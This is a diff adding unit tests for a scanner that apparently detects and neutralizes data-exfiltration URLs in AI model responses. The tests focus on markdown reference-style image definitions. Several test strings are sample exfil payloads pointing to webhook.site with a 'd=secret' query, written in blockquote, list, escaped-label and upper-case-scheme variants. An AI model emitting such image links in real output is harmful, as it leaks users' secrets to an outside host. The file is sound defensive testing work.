@@ -44,6 +44,55 @@ describe('scanResponseExfil', () => {
     expect(scanResponseExfil(text, isExfil)).toHaveLength(1)
   })
 
+  // #574: a reference-style image fetches the URL of its definition line, and
+  // the inline patterns never saw it.
+  describe('link reference definitions', () => {
+    const DOC = '![chart][r]\n\n[r]: https://webhook.site/?d=secret'
+
+    it('flags the URL of a definition, as an image', () => {
+      const f = scanResponseExfil(DOC, isExfil)
+      expect(f.map(x => [x.kind, x.url])).toEqual([['markdown-image', 'https://webhook.site/?d=secret']])
+    })
+
+    it('flags it inside a JSON response body, where line breaks are escaped', () => {
+      const body = JSON.stringify({ content: [{ type: 'text', text: DOC }] })
+      expect(scanResponseExfil(body, isExfil).map(x => x.url)).toEqual(['https://webhook.site/?d=secret'])
+      const lead = JSON.stringify({ content: [{ type: 'text', text: '[r]: <https://webhook.site/?d=1>' }] })
+      expect(scanResponseExfil(lead, isExfil).map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
+    })
+
+    it('does not flag a definition to a clean host', () => {
+      expect(scanResponseExfil('[docs]: https://trusted.com/help', isExfil)).toEqual([])
+    })
+
+    // A definition can sit in a blockquote or a list item, carry escapes in
+    // its label, or use an upper-case scheme; renderers accept all of them.
+    // Any `]:` before an exfil URL is flagged, whatever starts the line.
+    it('flags a definition whatever its line prefix, label or scheme case', () => {
+      for (const text of [
+        '> [r]: https://webhook.site/?d=1',
+        '- [r]: https://webhook.site/?d=1',
+        '1. [r]: https://webhook.site/?d=1',
+        '[a\\]b]: https://webhook.site/?d=1',
+        '[r]: HTTPS://webhook.site/?d=1',
+        'see the note [r]: https://webhook.site/?d=1',
+      ]) expect(scanResponseExfil(text, isExfil), text).toHaveLength(1)
+    })
+
+    it('is neutralized like an inline URL', () => {
+      expect(neutralizeExfil(DOC, scanResponseExfil(DOC, isExfil))).not.toContain('webhook.site')
+    })
+
+    it('stays linear on 200 KB of near-definitions', () => {
+      for (const filler of ['"[', '\n[', '\\n[ ', ' '.repeat(2), '1-', 'aZ09_-']) {
+        const text = filler.repeat(Math.ceil(200_000 / filler.length))
+        const started = Date.now()
+        scanResponseExfil(text, isExfil)
+        expect(Date.now() - started).toBeLessThan(500)
+      }
+    })
+  })
+
   it('handles empty input', () => {
     expect(scanResponseExfil('', isExfil)).toHaveLength(0)
   })
